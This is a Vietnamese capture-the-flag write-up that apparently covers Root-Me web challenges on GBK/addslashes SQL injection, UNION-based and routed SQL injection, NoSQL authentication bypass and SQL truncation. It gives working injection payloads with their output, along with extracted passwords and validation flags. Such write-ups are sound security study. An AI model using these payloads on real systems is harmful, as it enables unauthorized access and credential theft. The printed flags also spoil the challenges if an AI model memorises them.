## 41. SQL injection - Authentication - GBK
- GBK là phần ký tự Trung Quốc giản thể. GBK bao gồm tất cả ký tự Trung Quốc được định nghĩa trong unicode.
- Thường thì bên server sẽ sử dụng để bypass hàm addslashes().
- addslashes() dùng để thêm một dấu gạch chéo ngược (\\) phía trước các ký tự là dấu nháy kép, dấu nháy đơn và dấu gạch chéo ngược trong chuỗi.
- Do đó nếu thêm dấu ' vào thì nó sẽ thành \\' thêm slashes vào.
- Vì vậy giải pháp là chuyển thành GBK thì sẽ bypass được.
- Đầu tiên họ cho trang login thì chuyển login thành mảng để xem lỗi và họ báo lỗi dùng addslashes().
```js
login[]=admin&password=admin
```
- Vì kí tự %bf%5c hay %af%5c là ký tự Trung Quốc nên ta chỉ gần thêm %bf thì hàm sẽ thêm %5c(\\) vô sau và trở thành ký tự Trung Quốc.
```js
-- -: là comment trên mysql
': là %27
payload: login=%bf' or 1 = 1 -- -&& password = admin
Ấn chuyển hướng trang =>
Congratz! The validation password is: iMDaFlag1337!
```

## 42. SQL injection - String
- Đầu tiên tìm lỗi thì thấy ở thanh search khi nhập dấu ' báo lỗi  SQLite3::query(): nên ta biết họ dùng SQLite3.
- Tìm kiếm số bảng thì thấy có 2 bảng.
```js
payload: recherche = 1' order by 3--
=> bị lỗi nên có 2 bảng.
```
- Khai thác union query tìm kiếm tên bảng tìm được bảng news và users.
```js
payload: recherche=1' union select NULL,sql from sqlite_master--
```
- Rồi xem thông tin users
```js
payload: recherche=1' union select username,password from users--
=> username = admin , password = c4K04dtIaJsuWdi
```

## 47. NoSQL injection - Authentication
- Mở đầu thì thấy form đăng nhập thì đây là lỗi về nosql.
- Bật burp suite thao tác cho dễ.
- Đầu tiên vẫn dùng admin và admin thì nhận về bị bad request.
- Dùng cú pháp của nosql xem thử.
```js
GET /web-serveur/ch38/?login[$ne]=admin&pass[$ne]=admin HTTP/1.1

$ne: là so sánh không bằng (khác)
You are connected as : test
```
- Chuyển sang so sánh với test xem.
```js
GET /web-serveur/ch38/?login[$ne]=test&pass[$ne]=admin
You are connected as : admin
```
- Có nghĩa là ngoài test và admin còn một số user khác nên dùng $lt(lest than) và $gt(greater than) để xem khoảng ở giữa.
```js
GET /web-serveur/ch38/?login[$lt]=test&login[$gt]=admin&pass[$ne]=admin
You are connected as : flag{nosqli_no_secret_4_you}
```

## 50. SQL injection - Numeric
- Đầu tiên họ cho 1 form đăng nhập sau khi dò thì tìm được lỗi sql trên thanh url và dùng SQLite3.
- Đầu tiên vẫn kiểm tra số cột có thể tấn công.
```js
news_id=1 order by 10--
Warning: SQLite3::query(): Unable to prepare statement: 1, 1st ORDER BY term out of range - should be between 1 and 3 in /challenge/web-serveur/ch18/index.php on line 80
1st ORDER BY term out of range - should be between 1 and 3
```
- Có vẻ là có 3 cột.
```js
news_id=1 union select 1,2,3--
News
2
3
=> Chỉ có thể tấn công vào cột 2,3.
```
- Tiếp tra số bảng
```js
news_id=1 union select NULL,NULL,sql from sqlite_master--


CREATE TABLE news(id INTEGER, title TEXT, description TEXT)
CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)
```
- Vô đọc bảng users thôi.
```js
news_id=1 union select NULL,username,password from users--

username = admin
password = aTlkJYLjcbLmue3
```

## 51. SQL Injection - Routed
- SQL Injection - Routed là cách tiêm vào để thoát được 2 query lồng nhau do Routed lấy kết quả của query trước để làm tài nguyên cho câu query sau.
- Tìm thì thấy lỗ hổng ở thanh search. Vì là query lồng nhau nên tìm số bảng đầu tiên.
```js
login='union select 1' order by 10 -- - -- -

Attack detected!
```
- Vì key order by đã bị FILTER nên tìm hiểu thì có thể dùng mã hex để bypass. Qua thử từng cái thì tìm được có 2 cột.
```js
login='union select 1' order by 3 -- - -- -
=> login='union select 1' 0x276f726465722062792033202d2d202d -- -
Unknown column '3' in 'order clause'
```
- Sau khi thử select 1,2 thì có thể khai thác được cả 2 cột.
- Tiếp đến tìm tên DB có thể xem cheat sheet ở đây
##### https://portswigger.net/web-security/sql-injection/cheat-sheet
```js
login='union select 'union select NULL,@@version-- - -- -
=> login='union select 0x27756e696f6e2073656c65637420404076657273696f6e2e4e554c4c2d2d202d -- -

[+] Requested login: ' union select 0x27756e696f6e2073656c656374204e554c4c2c404076657273696f6e2d2d202d -- -<br>
[+] Found ID: <br>
[+] Email: 10.3.34-MariaDB-0ubuntu0.20.04.1<br>
```
- Vì MariaDB khá tương đồng với MySQL nên dùng cheat sheet của MySQL luôn.
- Tìm tên bảng.
```js
login='union select ' union select NULL,table_name from information_schema.tables where table_schema = database() -- - -- -
=> login = 'union select ' 0x27756e696f6e2073656c656374204e554c4c2c7461626c655f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d61203d2064617461626173652829202d2d202d  -- -

[+] Requested login: ' union select 0x27756e696f6e2073656c656374204e554c4c2c7461626c655f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d61203d2064617461626173652829202d2d202d -- -<br>
[+] Found ID: <br>
[+] Email: users<br>
```
- Hiện tên cột trong bảng user
```js
login='union select ' union SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'-- - -- -
=> login = 'union select ' 0x2720756e696f6e2053454c45435420312c67726f75705f636f6e63617428636f6c756d6e5f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73205748455245207461626c655f6e616d65203d20277573657273272d2d202d  -- -

[+] Found ID: 1<br>
[+] Email: id,login,password,email<br>
```
- Hiện login và password là xong.

```js
login='union select 'union SELECT NULL,group_concat(login,'-',password) FROM users-- - -- -
=> login = 'union select ' 0x27756e696f6e2053454c454354204e554c4c2c67726f75705f636f6e636174286c6f67696e2c27202d20272c70617373776f7264292046524f4d2075736572732d2d202d  -- -

[+] Email: admin - qs89QdAs9A,jean - superpass,michel - mypass<br>
```

## 52. SQL Truncation
- Truncation nghĩa là cắt bớt input.
- Đọc source code thì có phần gợi ý về bảng user
```js
<!--
CREATE TABLE IF NOT EXISTS user(   
	id INT NOT NULL AUTO_INCREMENT,
    login VARCHAR(12),
    password CHAR(32),
    PRIMARY KEY (id));
-->
```
- Thì trang web có cho 2 path đăng kí và đăng nhập. Đầu tiên đăng kí tài khoản admin thì nó báo đã tồn tại nên việc bây giờ là bypass admin.
- Vì cột login chỉ có 12 kí tự nên nếu ta điền vượt quá thì nó sẽ tự động cắt bớt nên sẽ điền như sau.
```js
login = admin       aaaa
password = 12345678
=> admin: 5 ký tự nên cần thêm 7 ký tự trắng nữa là được   

Well done ! Flag de validation / Validation flag : J41m3Qu4nD54Tr0nc
```


